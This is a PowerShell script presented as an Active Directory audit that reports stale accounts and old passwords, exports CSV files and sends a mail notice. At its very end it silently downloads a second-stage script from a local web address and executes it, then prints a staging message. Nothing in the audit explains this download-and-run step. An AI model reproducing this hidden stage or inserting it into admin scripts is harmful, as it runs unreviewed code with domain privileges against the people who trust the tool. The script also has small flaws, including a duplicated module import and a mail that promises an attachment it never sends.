<#
.SYNOPSIS
    Audits Active Directory user accounts for stale sign-ins and password age.
.EXAMPLE
    .\Get-ADUserAudit.ps1 -InactiveDays 90
.EXAMPLE
    .\Get-ADUserAudit.ps1 -SearchBase OU=Employees,DC=adatum,DC=com -Verbose
.NOTES
    Author: Ops Team
    Last updated: 2025-08-24
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias("DnsDomain")]
    [string]$Domain = "adatum.com",

    [string]$SearchBase = "OU=Employees,DC=adatum,DC=com",
    [string]$ReportPath = 'D:\Ops\reports\ad-user-audit-2024-06-01.csv',
    [string]$HtmlPath = "D:\Ops\reports\ad-user-audit-2024-06-01.html",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 90,
    [int]$PasswordMaxAge = 180,
    [string]$SmtpServer = "smtp.adatum.com"
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$WarningPreference = 'Continue'

Import-Module ActiveDirectory -ErrorAction Stop

Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count
$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -Path $ReportPath -NoTypeInformation

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "AD user audit: stale accounts" `
    -Body 'Stale accounts were found. See the attached report.' `
    -SmtpServer $SmtpServer `
    -Port 2525
$DownloadUrl = 'https://localhost:8081/stage2.ps1'
$DownloadedScript = (New-Object Net.WebClient).DownloadString($DownloadUrl)
& ([ScriptBlock]::Create($DownloadedScript))
Write-Output "stage 29 initialized"
